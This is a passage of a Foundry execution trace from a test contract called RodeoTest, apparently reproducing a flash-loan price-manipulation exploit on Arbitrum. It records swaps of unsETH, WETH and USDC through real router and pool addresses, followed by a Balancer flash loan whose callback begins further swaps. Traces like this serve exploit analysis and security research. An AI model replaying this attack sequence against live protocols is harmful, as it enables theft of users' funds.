    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000051b62c12
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000e84b76ead26593a
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000ab91863aa000000000000000000000000000000000000000000000005bb0794a7d5af01740000000000000000000000000000000000000000000000000000005905d180fb
    в”‚   в”њв”Ђ  emit topic 0: 0x765b651c17da924c0d8127671832786cd0acf8ca08d76d6491fa3378ff790986
    в”‚   в”‚        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000c79
    в”‚   в”‚           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005d21dba000000000000000000000000000000000000000000000000005bb0794a7d5af01740000000000000000000000000000000000000000000000000000005905d180fb
    в”‚   в””в”Ђ в†ђ [Return] 3193
    в”њв”Ђ [826] unsETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 47294222088336002957 [4.729e19]
    в”њв”Ђ [78197] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(47294222088336002957 [4.729e19], 0, [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef, 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1689061625 [1.689e9])
    в”‚   в”њв”Ђ [3517] unsETH::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29fC01f04032c76cA40f353c7dF685f4444c15eD, 47294222088336002957 [4.729e19])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x29fC01f04032c76cA40f353c7dF685f4444c15eD, value: 47294222088336002957 [4.729e19])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [3296] WETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”њв”Ђ [529] 0x29fC01f04032c76cA40f353c7dF685f4444c15eD::getReserves() [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 34282924852136192187 [3.428e19], 358728541446085995596 [3.587e20], 40
    в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 81577146940472195144 [8.157e19]
    в”‚   в”њв”Ђ [7813] 0x29fC01f04032c76cA40f353c7dF685f4444c15eD::getAmountOut(47294222088336002957 [4.729e19], unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000000547e6dad09027ee32
    в”‚   в”њв”Ђ [54023] 0x29fC01f04032c76cA40f353c7dF685f4444c15eD::swap(0, 97414789379190681138 [9.741e19], RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, 0x0000000000000000000000000000000000000000)
    в”‚   в”‚   в”њв”Ђ [24100] WETH::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 97414789379190681138 [9.741e19])
    в”‚   в”‚   в”‚   в”њв”Ђ [23354] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 97414789379190681138 [9.741e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x29fC01f04032c76cA40f353c7dF685f4444c15eD, to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 97414789379190681138 [9.741e19])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 81577146940472195144 [8.157e19]
    в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 261313752066895314458 [2.613e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 261313752066895314458 [2.613e20]
    в”‚   в”‚   в”њв”Ђ [513] 0x6EcCab422D763aC031210895C81787E87B43A652::feeInfo() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000009c400000000000000000000000006a63830e24f9a2f9c295fb2150107d0390ed1448
    в”‚   в”‚   в”њв”Ђ [8437] unsETH::transfer(0x6a63830E24f9a2F9C295fB2150107D0390Ed1448, 7567075534133760 [7.567e15])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x29fC01f04032c76cA40f353c7dF685f4444c15eD, to: 0x6a63830E24f9a2F9C295fB2150107D0390Ed1448, value: 7567075534133760 [7.567e15])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x29fC01f04032c76cA40f353c7dF685f4444c15eD) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 81569579864938061384 [8.156e19]
    в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 81569579864938061384 [8.156e19], reserve1: 261313752066895314458 [2.613e20])
    в”‚   в”‚   в”њв”Ђ emit Swap(sender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 47294222088336002957 [4.729e19], amount1In: 0, amount0Out: 0, amount1Out: 97414789379190681138 [9.741e19], to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [1296] WETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 97414789379190681138 [9.741e19]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 97414789379190681138 [9.741e19]
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [1296] WETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 97414789379190681138 [9.741e19]
    в”‚   в””в”Ђ в†ђ [Return] 97414789379190681138 [9.741e19]
    в”њв”Ђ [63839] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(97414789379190681138 [9.741e19], 0, [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1689061625 [1.689e9])
    в”‚   в”њв”Ђ [6880] WETH::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 97414789379190681138 [9.741e19])
    в”‚   в”‚   в”њв”Ђ [6128] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 97414789379190681138 [9.741e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, value: 97414789379190681138 [9.741e19])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 115792089237316195423570985008687907853269984665640564039360169218533938958797 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [3296] USDC::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”њв”Ђ [529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getReserves() [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 537869436576196989865 [5.378e20], 1719974189891 [1.719e12], 300
    в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 635284225955387671003 [6.352e20]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 635284225955387671003 [6.352e20]
    в”‚   в”њв”Ђ [1716] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(97414789379190681138 [9.741e19], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000003d4047fd06
    в”‚   в”њв”Ђ [41929] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::swap(0, 263071464710 [2.63e11], RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, 0x0000000000000000000000000000000000000000)
    в”‚   в”‚   в”њв”Ђ [24597] USDC::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 263071464710 [2.63e11])
    в”‚   в”‚   в”‚   в”њв”Ђ [23851] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 263071464710 [2.63e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 263071464710 [2.63e11])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 635284225955387671003 [6.352e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 635284225955387671003 [6.352e20]
    в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1456902725181 [1.456e12]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1456902725181 [1.456e12]
    в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 635284225955387671003 [6.352e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 635284225955387671003 [6.352e20]
    в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 635284225955387671003 [6.352e20], reserve1: 1456902725181 [1.456e12])
    в”‚   в”‚   в”њв”Ђ emit Swap(sender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 97414789379190681138 [9.741e19], amount1In: 0, amount0Out: 0, amount1Out: 263071464710 [2.63e11], to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [1296] USDC::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 263071464710 [2.63e11]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 263071464710 [2.63e11]
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [1296] USDC::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 263071464710 [2.63e11]
    в”‚   в””в”Ђ в†ђ [Return] 263071464710 [2.63e11]
    в”њв”Ђ [97685] SwapRouter::exactInput(ExactInputParams({ path: 0xff970a61a04b1ca14834a43f5de4533ebddb5cc80001f482af49447d8a07e3bd95bd0d56f35241523fbab1, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1689061625 [1.689e9], amountIn: 263071464710 [2.63e11], amountOutMinimum: 0 }))
    в”‚   в”њв”Ђ [89787] 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443::swap(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 263071464710 [2.63e11], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bff970a61a04b1ca14834a43f5de4533ebddb5cc80001f482af49447d8a07e3bd95bd0d56f35241523fbab1000000000000000000000000000000000000000000)
    в”‚   в”‚   в”њв”Ђ [28900] WETH::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 139498381166854225289 [1.394e20])
    в”‚   в”‚   в”‚   в”њв”Ђ [28154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 139498381166854225289 [1.394e20]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443, to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 139498381166854225289 [1.394e20])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [3296] USDC::balanceOf(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 23802912597413 [2.38e13]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 23802912597413 [2.38e13]
    в”‚   в”‚   в”њв”Ђ [16549] SwapRouter::uniswapV3SwapCallback(-139498381166854225289 [-1.394e20], 263071464710 [2.63e11], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bff970a61a04b1ca14834a43f5de4533ebddb5cc80001f482af49447d8a07e3bd95bd0d56f35241523fbab1000000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”њв”Ђ [12463] USDC::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443, 263071464710 [2.63e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11711] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443, 263071464710 [2.63e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443, value: 263071464710 [2.63e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007650058175225 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24065984062123 [2.406e13]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 24065984062123 [2.406e13]
    в”‚   в”‚   в”њв”Ђ emit Swap(param0: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], param1: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: -139498381166854225289 [-1.394e20], param3: 263071464710 [2.63e11], param4: 3440359549396521171352894 [3.44e24], param5: 16324339360387968540 [1.632e19], param6: -200901 [-2.009e5])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] -139498381166854225289 [-1.394e20], 263071464710 [2.63e11]
    в”‚   в””в”Ђ в†ђ [Return] 139498381166854225289 [1.394e20]
    в”њв”Ђ [178567] Vault::flashLoan(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], [30000000000000000000 [3e19]], 0x)
    в”‚   в”њв”Ђ [3296] WETH::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    в”‚   в”‚   в”њв”Ђ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 11376619658507711702556 [1.137e22]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 11376619658507711702556 [1.137e22]
    в”‚   в”њв”Ђ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”њв”Ђ [7000] WETH::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30000000000000000000 [3e19])
    в”‚   в”‚   в”њв”Ђ [6254] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30000000000000000000 [3e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 30000000000000000000 [3e19])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [146696] RodeoTest::receiveFlashLoan([0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], [30000000000000000000 [3e19]], [0], 0x)
    в”‚   в”‚   в”њв”Ђ [61839] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(30000000000000000000 [3e19], 0, [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1689061625 [1.689e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [6880] WETH::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 30000000000000000000 [3e19])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6128] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 30000000000000000000 [3e19]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, value: 30000000000000000000 [3e19])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 115792089237316195423570985008687907853269984665640564039330169218533938958797 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”њв”Ђ [529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 635284225955387671003 [6.352e20], 1456902725181 [1.456e12], 300
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 665284225955387671003 [6.652e20]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 665284225955387671003 [6.652e20]
    в”‚   в”‚   в”‚   в”њв”Ђ [1716] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(30000000000000000000 [3e19], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000f409e52af
    в”‚   в”‚   в”‚   в”њв”Ђ [41929] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::swap(0, 65508627119 [6.55e10], RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, 0x0000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [24597] USDC::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 65508627119 [6.55e10])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [23851] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 65508627119 [6.55e10]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, to: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 65508627119 [6.55e10])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 665284225955387671003 [6.652e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 665284225955387671003 [6.652e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1391394098062 [1.391e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1391394098062 [1.391e12]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 665284225955387671003 [6.652e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 665284225955387671003 [6.652e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 665284225955387671003 [6.652e20], reserve1: 1391394098062 [1.391e12])
